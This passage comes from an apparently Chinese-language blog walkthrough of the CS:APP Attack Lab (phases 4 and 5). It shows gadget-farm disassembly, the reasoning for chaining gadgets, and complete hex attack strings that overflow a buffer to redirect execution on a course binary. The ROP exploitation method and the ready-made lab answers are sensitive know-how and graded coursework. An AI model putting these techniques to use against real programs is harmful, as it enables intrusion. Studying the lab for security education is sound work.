+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">e4:</span>	<span class="nf">b8</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="nv">c3</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc3e08948</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">e9:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">ea</span> <span class="o">&lt;</span><span class="nv">addval_139</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">ea:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">89</span> <span class="nv">d6</span> <span class="mi">60</span> <span class="nv">c9</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x369f2977</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">f0:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">f1</span> <span class="o">&lt;</span><span class="nv">setval_408</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">f1:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">8</span><span class="nv">b</span> <span class="nv">ca</span> <span class="mi">90</span> <span class="nv">c3</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc390ca8b</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">f7:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">f8</span> <span class="o">&lt;</span><span class="nv">setval_181</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">f8:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="nv">d6</span> <span class="mi">84</span> <span class="nv">d2</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xd284d689</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">fe:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">ff</span> <span class="o">&lt;</span><span class="nv">addval_222</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">ff:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">09</span> <span class="nv">ca</span> <span class="mi">20</span> <span class="nv">d2</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x2ddf35f7</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a05:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401</span><span class="nf">a06</span> <span class="o">&lt;</span><span class="nv">setval_336</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a06:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">89</span> <span class="nv">ca</span> <span class="nv">c3</span> <span class="mi">2</span><span class="nv">a</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x2ac3ca89</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a0c:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401</span><span class="nf">a0d</span> <span class="o">&lt;</span><span class="nv">addval_205</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a0d:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="nv">a9</span> <span class="nv">c1</span> <span class="mi">08</span> <span class="nv">c0</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x3ff73e57</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a13:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401</span><span class="nf">a14</span> <span class="o">&lt;</span><span class="nv">setval_221</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a14:</span>	<span class="nf">c7</span> <span class="mi">07</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="nv">c2</span>    	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0xc2e08948</span><span class="p">,(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a1a:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401</span><span class="nf">a1b</span> <span class="o">&lt;</span><span class="nv">end_farm</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a1b:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a20:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>   
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a21:</span>	<span class="err">66</span> <span class="err">2</span><span class="nf">e</span> <span class="mi">0</span><span class="nv">f</span> <span class="mi">1</span><span class="nv">f</span> <span class="mi">84</span> <span class="mi">00</span> <span class="mi">00</span> 	<span class="nv">nopw</span>   <span class="o">%</span><span class="nb">cs</span><span class="p">:</span><span class="mh">0x0</span><span class="p">(</span><span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a28:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a2b:</span>	<span class="err">0</span><span class="nf">f</span> <span class="mi">1</span><span class="nv">f</span> <span class="mi">44</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">nopl</span>   <span class="mh">0x0</span><span class="p">(</span><span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div></li>
+</ul>
+<p>我们的工作是从<strong>gadget farm</strong>中挑选出有用的gadget，执行类似于前述第二关和第三关的攻击。</p>
+<blockquote>
+<p>函数<code>start_farm</code>和<code>end_farm</code>之间的所有函数构成了你的gadget farm。
+不要用程序代码中的其他部分作为你的gadget。</p></blockquote>
+<p>同时，给出了一些指令的字节值：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/493a2f2b-f237-4a46-83b8-183230ab7d24/%E6%88%AA%E5%B1%8F2023-12-11_11.04.51.png" alt="截屏2023-12-11 11.04.51.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<h3 id="phase-4-level-2">Phase 4 Level 2</h3>
+<h4 id="任务-3">任务</h4>
+<p>重复<strong>Phase 2 Level 2</strong>的攻击——让程序执行<code>touch2</code>而不是返回<code>test</code>，并使调用<code>touch2</code>时参数为我的<strong>cookie</strong>（ungisned类型）——但需要使用<strong>gadget farm</strong>里的<strong>gadget</strong>来攻击<strong>RTARGET</strong>程序。</p>
+<p>答案只使用如下指令类型的gadget，也只能使用前八个x86-64寄存器（<code>%rax</code>-<code>%rdi</code>）。</p>
+<ul>
+<li>movq：代码如前图所示。</li>
+<li>popq：代码如前图所示。</li>
+<li>ret：该指令编码为<code>0xc3</code>。</li>
+<li>nop：该指令编码为<code>0x90</code>。</li>
+</ul>
+<blockquote>
+<p>💡<strong>注意：</strong></p>
+<ul>
+<li>只能用两个<strong>gadget</strong>来实现该次攻击。</li>
+<li>如果一个<strong>gadget</strong>使用了<code>popq</code>指令，那么它会从栈中弹出数据。这样一来，你的攻击代码能既包含<strong>gadget</strong>的地址也包含数据。</li>
+</ul></blockquote>
+<h4 id="思路-3">思路</h4>
+<p>在<strong>Level 2</strong>中，攻击代码为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">movq</span> <span class="kc">$</span><span class="mh">0x2ded9dc0</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>   <span class="c1">; 设置参数为cookie的值</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pushq</span> <span class="kc">$</span><span class="mh">0x4017a4</span>        <span class="c1">; 将touch2的首地址压栈，待ret跳转时使用</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div><p>但在这里，我们显然无法进行立即数的赋值，只能通过字符串攻击将<strong>cookie</strong>存入栈中，然后通过<code>popq</code>操作将其弹出并赋值给指定寄存器。</p>
+<p>因此，猜测目标攻击代码主体大概为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="c1">; 假设已经通过Gets函数的输入溢出将cookie写入栈中</span>
+</span></span><span class="line"><span class="cl"><span class="nf">popq</span> <span class="o">%</span><span class="nb">rdi</span>          <span class="c1">; 弹出cookie并存入%rdi 5f</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>                <span class="c1">; 弹出touch2的地址，进行返回跳转</span>
+</span></span></code></pre></div><p>查询<strong>gadget farm</strong>函数组，发现没有对应于<code>popq %rdi</code>的字节值，于是需要找另一个寄存器来当中介。</p>
+<p>经过一番查找，发现<code>%rax</code>适合当中介——函数组内具有<code>popq</code>和<code>movq</code>指令对应的字节值、且后面紧跟着<code>ret</code>指令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">000000000040191</span><span class="nf">b</span> <span class="o">&lt;</span><span class="nv">getval_382</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40191</span><span class="nl">b:</span>	<span class="nf">b8</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">c7</span> <span class="mi">90</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x90c78948</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401920:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401921</span> <span class="err">&lt;</span><span class="nf">getval_109</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401921:</span>	<span class="nf">b8</span> <span class="mi">29</span> <span class="mi">58</span> <span class="mi">90</span> <span class="nv">c3</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0xc3905829</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401926:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
+</span></span></code></pre></div><blockquote>
+<p>题目有提示，<code>0x90</code>对应的是空指令<code>nop</code>，因此可忽略</p></blockquote>
+<p>于是攻击代码为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">popq</span> <span class="o">%</span><span class="nb">rax</span>         <span class="c1">; 58</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span><span class="line"><span class="cl"><span class="c1">;;;;;;;;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movq</span> <span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>    <span class="c1">; 48 89 c7</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div><h4 id="栈结构-3">栈结构</h4>
+<p>根据<strong>gadget farm</strong>函数组中找到的两个函数，可知攻击代码的地址分别为<code>0x401923</code>和<code>0x40191c</code>。</p>
+<p><code>getbuf</code>函数执行<code>ret</code>返回后的栈结构如下：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/2f7fae16-09f3-42d9-9d05-91ca63f41c68/Untitled.png" alt="Untitled.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>具体而言，<code>getbuf</code>函数返回后将跳转<code>0x401923</code>执行<code>popq</code>命令，于是栈指针<code>rsp</code>上移并将<strong>cookie</strong>弹出；之后执行<code>ret</code>命令，栈弹出地址<code>0x40191c</code>并跳转，执行<code>movq</code>命令后<code>ret</code>，栈弹出<code>&amp;(touch2)</code>，跳转执行函数<code>touch2</code>。</p>
+<blockquote>
+<p>其实<code>test</code>函数的栈桢并没有这么长，在<strong>Phase 3 Level 3</strong> 中我们已经查看过了，它的栈桢只有16字节——8字节的可用空间和8字节的返回地址（其值为<code>0x401df3</code>）；
+这里只是方便起见，用<code>test</code>笼统地称呼高位栈的父函数们，包括最后一个任务，“<code>test</code>函数”的栈桢会更长（罪过罪过）。</p></blockquote>
+<h4 id="解决-3">解决</h4>
+<p>可得攻击字符串：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// 填充getbuf栈桢前部分
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">23</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// popq %rax; ret 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">c0</span> <span class="mi">9</span><span class="n">d</span> <span class="n">ed</span> <span class="mi">2</span><span class="n">d</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// cookie
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="n">c</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movq %rax,%rdi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">a4</span> <span class="mi">17</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// 函数touch2首地址
+</span></span></span></code></pre></div><p>执行后完成任务。</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/6f66b3a4-82de-45e8-91f9-9338e21689ac/%E6%88%AA%E5%B1%8F2023-12-11_12.53.00.png" alt="截屏2023-12-11 12.53.00.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<hr>
+<h3 id="phase-5-level-3">Phase 5 Level 3</h3>
+<p>在<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">CMU实验指导原文PDF</a>中，这里放了一段劝退文案：</p>
+<blockquote>
+<p><em>Before you take on the Phase 5, pause to consider what you have accomplished so far. In Phases 2 and 3, you caused a program to execute machine code of your own design. If CTARGET had been a network server, you could have injected your own code into a distant machine. In Phase 4, you circumvented two of the main devices modern systems use to thwart buffer overflow attacks. Although you did not inject your own code, you were able inject a type of program that operates by stitching together sequences of existing code. You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.
+Phase 5 requires you to do an ROP attack on RTARGET to invoke function touch3 with a pointer to a string representation of your cookie. That may not seem significantly more difficult than using an ROP attack to invoke touch2, except that we have made it so. Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require. Think of it as more an extra credit problem for those who want to go beyond the normal expectations for the course.</em></p></blockquote>
+<p>我不管我就是要做</p>
+<h4 id="任务-4">任务</h4>
+<p>对<strong>RTARGET</strong>程序进行<strong>ROP</strong>攻击，重复<strong>Phase 3 Level 3</strong>的效果——使程序调用<code>touch3</code>函数，且参数为指向<strong>cookie</strong>字符串的指针，</p>
+<p>这一关，允许你使用函数start_farm和end_farm之间的所有gadget。</p>
+<p>除了第四阶段允许的那些指令，还允许使用<code>movl</code>指令，以及D中的2字节指令（如前图所示），它们可以作为有功能的nop，不改变任何寄存器或内存的值。（例如，<code>andb %al, %al</code>，这些指令对寄存器的低位字节做操作，但是不改变它们的值）</p>
+<p>💡<strong>提示：</strong></p>
+<ul>
+<li>官方答案需要8个gadgets。</li>
+</ul>
+<h4 id="思路-4">思路</h4>
+<p><strong>Phase 3 Level 3</strong> 中的攻击代码为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">movq</span> <span class="kc">$</span><span class="mh">0x55654948</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>  <span class="c1">; 设置参数为cookie字符串的首地址</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pushq</span> <span class="kc">$</span><span class="mh">0x401878</span>        <span class="c1">; 压栈touch3的首地址</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>                    <span class="c1">; 返回，跳转touch3</span>
+</span></span></code></pre></div><p>但由于<strong>RTARGET</strong>程序的栈是随机化的，无法直接指定存入栈中的<strong>cookie</strong>字符串的地址，只能通过栈指针<code>rsp</code>加上一个偏移量来访问</p>
+<p>因此，我们必然使用到<code>lea</code>命令，但题目并未给出<code>lea</code>命令的字节值，查阅<strong>gadget farm</strong>函数组，发现有一个现成的gadget可以用：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0000000000401941</span> <span class="err">&lt;</span><span class="nf">add_xy</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401941:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">04</span> <span class="mi">37</span>          	<span class="nv">lea</span>    <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">,</span><span class="o">%</span><span class="nb">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="nb">rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401945:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
+</span></span></code></pre></div><p>此外，也可以发现<code>movq %rsp,xxx</code>在<strong>gadget farm</strong>函数组中存在的字节值：（最终确定目标寄存器为<code>%rax</code>）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">00000000004019</span><span class="nf">af</span> <span class="o">&lt;</span><span class="nv">addval_497</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">af:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">48</span> <span class="mi">89</span> <span class="nv">e0</span> <span class="mi">90</span>    	<span class="nv">lea</span>    <span class="o">-</span><span class="mh">0x6f1f76b8</span><span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">b5:</span>	<span class="nf">c3</span>                   	<span class="nv">retq</span>
+</span></span></code></pre></div><p>而用于访问<strong>cookie</strong>的偏移量也需要存入栈中，通过<code>pop</code>弹出使用，于是目标攻击代码主体大概为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">movq</span> <span class="o">%</span><span class="nb">rsp</span><span class="p">,</span><span class="o">%</span><span class="nb">rax</span>   <span class="c1">; 获取栈指针</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movq</span> <span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>   <span class="c1">; </span>
+</span></span><span class="line"><span class="cl"><span class="nf">popq</span> <span class="o">%</span><span class="nb">rsi</span>        <span class="c1">; 弹出偏移量</span>
+</span></span><span class="line"><span class="cl"><span class="nf">lea</span> <span class="p">(</span><span class="o">%</span><span class="nb">rdi</span><span class="p">,</span><span class="o">%</span><span class="nb">rsi</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="o">%</span><span class="nb">rax</span>  <span class="c1">; 计算cookie首地址</span>
+</span></span><span class="line"><span class="cl"><span class="nf">movq</span> <span class="o">%</span><span class="nb">rax</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>   <span class="c1">; </span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>              <span class="c1">; 跳转执行touch3</span>
+</span></span></code></pre></div><p>查阅<strong>gadget farm</strong>函数组，发现攻击代码竟然可以全部实现、不用拐弯抹角，那就开心进行吧。</p>
+<h4 id="栈结构1">栈结构1</h4>
+<blockquote>
+<p>需要注意，偏移量的确定需要考虑执行<code>movq %rsp,%rax</code>命令时的栈指针地址。（其为<code>0x55654948</code>）</p></blockquote>
+<p><code>getbuf</code>函数执行<code>ret</code>返回后的栈结构如下：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/021bfdf0-743d-43f7-95fc-96fe5e198296/Untitled.png" alt="Untitled" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<h4 id="解决1">解决1</h4>
+<p>攻击字符串如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">b1</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movq %rsp,%rax; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="n">c</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movq %rax,%rdi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">f2</span> <span class="mi">21</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// popq %rsi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">30</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// 偏移量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">41</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// lea (%rdi,%rsi,1),%rax; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">1</span><span class="n">c</span> <span class="mi">19</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// movq %rax, %rdi; ret
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">78</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// &amp;(touch3)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">32</span> <span class="mi">64</span> <span class="mi">65</span> <span class="mi">64</span> <span class="mi">39</span> <span class="mi">64</span> <span class="mi">63</span> <span class="mi">30</span> <span class="c1">// cookie的ASCII码字节值（小端）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">00</span>                      <span class="c1">// 字符串末尾要更上一个`\0`字符
+</span></span></span></code></pre></div><p>执行，任务完成。（才怪）</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/322fdcf7-8d54-4fee-9a6b-2400337fbdca/%E6%88%AA%E5%B1%8F2023-12-11_20.08.22.png" alt="截屏2023-12-11 20.08.22.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<h4 id="粗心咯">粗心咯！</h4>
+<p>但是！打开Scoreboard发现成绩被标注”Invalid”，看来必须要使用整整<strong>8</strong>个<strong>gadget</strong>才行。</p>
+<p>
+
+
+
+
+
+
+
